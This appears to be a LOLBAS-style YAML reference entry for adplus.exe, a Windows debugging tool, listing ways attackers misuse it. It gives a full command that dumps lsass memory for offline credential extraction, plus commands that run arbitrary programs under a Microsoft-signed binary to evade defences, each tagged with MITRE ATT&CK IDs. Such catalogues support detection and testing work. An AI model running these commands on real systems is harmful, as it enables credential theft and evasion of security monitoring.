---
Name: adplus.exe
Description: Debugging tool included with Windows Debugging Tools
Author: mr.d0x
Created: 2021-09-01
Commands:
  - Command: adplus.exe -hang -pn lsass.exe -o c:\users\mr.d0x\output\folder -quiet
    Description: Creates a memory dump of the lsass process
    Usecase: Create memory dump and parse it offline
    Category: Dump
    Privileges: SYSTEM
    MitreID: T1003.001
    OperatingSystem: All Windows
  - Command: adplus.exe -c <config>
    Description: Execute arbitrary commands or dump process memory using config adplus file
    Usecase: Run commands under a trusted Microsoft signed binary
    Category: Execute
    Privileges: User
    MitreID: T1127
    OperatingSystem: All Windows
  - Command: adplus.exe -crash -o <outputfolder> -sc <command>
    Description: Execute arbitrary commands and binaries from the context of adplus
    Usecase: Run commands under a trusted Microsoft signed binary
    Category: Execute
    Privileges: User
    MitreID: T1127
    OperatingSystem: All Windows
Full_Path:
